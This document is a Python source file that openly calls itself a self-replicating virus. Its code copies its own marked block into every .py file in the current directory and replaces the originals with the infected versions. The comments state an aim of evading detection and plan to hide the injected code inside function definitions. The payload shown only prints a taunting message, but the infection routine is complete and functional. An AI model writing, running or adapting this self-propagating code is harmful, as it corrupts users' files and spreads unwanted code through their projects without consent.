# A self-replicating virus written by Isa Fichtinger
# This program will infect .py files with itself, obscuring the code
# in order to evade detection
# Perhaps, implement multithreading in order to be able to wait for files to become available without halting execution of the infected original script? 


# body-start
import shutil
import os
import glob
import base64
import hashlib


# Function retrieves the marked virus code from the host script
def get_virus():
    current_file_lines = None
    with open(__file__, "r") as current_file:
        current_file_lines = current_file.readlines()

    virus_hash = hashlib.md5(os.path.abspath(__file__).encode("utf-8")).hexdigest()
    start_hash = "# start-" + virus_hash
    end_hash = "# end-" + virus_hash
    is_catching = False
    virus_lines = []
    for line in current_file_lines:
        if (start_hash in line or "# body-start\n" in line):
            is_catching = True
            # virus_lines.append(start_hash + "\n")
            # print("start catching")
            # continue
        if is_catching:
            virus_lines.append(line)
        if (end_hash in line or "# body-end\n" in line):
            is_catching = False
            # virus_lines.append(end_hash + "\n")
            # print("end catching")
            # break
            
    return virus_lines

def find_infectable_files(directory = "."):
    return [file for file in glob.glob("*.py")]

def infect(target, virus_code):


    # Change name hash in virus_code to target name 
    name_hash = hashlib.md5(os.path.abspath(target).encode("utf-8")).hexdigest()
    new_code = virus_code
    new_code[0] = "# start-" + name_hash + "\n"
    new_code[-1] = "# end-" + name_hash + "\n"
    
    # read lines of file
    target_file_lines = None
    with open(target, "r") as target_original:
        target_file_lines = target_original.readlines()
    for line in target_file_lines:
        if name_hash in line or "# body-start\n" in line:
            print("cringe detewcted")
            return None
    # find somewhere in the file to inject the code (will have to develop this algorithm, but I don't want it to just put it at the top of the code..... should be interspersed somewhere within function definitions)
    # FOR NOW THIS WILL BE START OF FILE
    injection_point = 0
    # inject code (into read list)
    target_new_lines = target_file_lines[:injection_point] + new_code + target_file_lines[injection_point:]
    # target_new = virus_code + target_file_lines
    
    # create a copy of the file, write newly created version of original file w. injected code to it 
    new_file = target + ".inf"
    shutil.copy2(target, new_file)
    with open(new_file, "w") as new_file_obj:
        new_file_obj.writelines(target_new_lines)
    # wait for original to become available, delete original, rename copy to same name as original
    os.remove(target)
    os.rename(new_file, target)

def payload():
    # execute the spicy, nefarious payload here... 
    print("You have been pwned, bozo.,....")

# try:
# retrieve code from current script
virus = get_virus()

# look for infectable files
for file in find_infectable_files():
    infect(file, virus)

# run the payload
payload()

# except:
    # pass

# body-end
